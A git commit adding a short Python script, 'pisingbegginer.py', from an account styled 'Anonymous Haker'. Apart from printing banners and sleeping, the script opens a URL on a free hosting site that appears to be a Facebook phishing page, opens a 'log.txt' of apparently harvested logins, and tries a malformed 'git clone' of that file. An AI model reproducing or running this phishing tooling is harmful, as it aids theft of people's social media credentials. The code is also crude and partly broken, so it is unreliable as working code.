60ff28a8036c9e450c09be2cff1649cfcc3bd78d
♛Anonymous Haker♛ <95759540+Anonimus-Haker-Alon-Kreker-Darker@users.noreply.github.com>
2022-03-17 03:35:43 +0100

    Add files via upload

---
+++ pisingbegginer.py
@@ -0,0 +1,21 @@
+import os, sys, time
+from os import  system
+from time import sleep
+os.system("color A")
+print("~~" * 50)
+print("                                    Anonymous Alon kreker    ")
+time.sleep(50)
+os.system("cls")
+system("clear")
+print("~~" * 50)
+os.system("start https://helppopol.000webhostapp.com/facebook.php")
+print("~~" * 50)
+time.sleep(50)
+print("~~" * 50)
+os.system("start https://helppopol.000webhostapp.com/log.txt")
+print("~~" * 50)
+time.sleep(50)
+print("~~" * 50)
+os.system("git clone https://helppopol.000webhostapp.com/log.txt")
+print("~~" * 50)
+time.sleep(50)
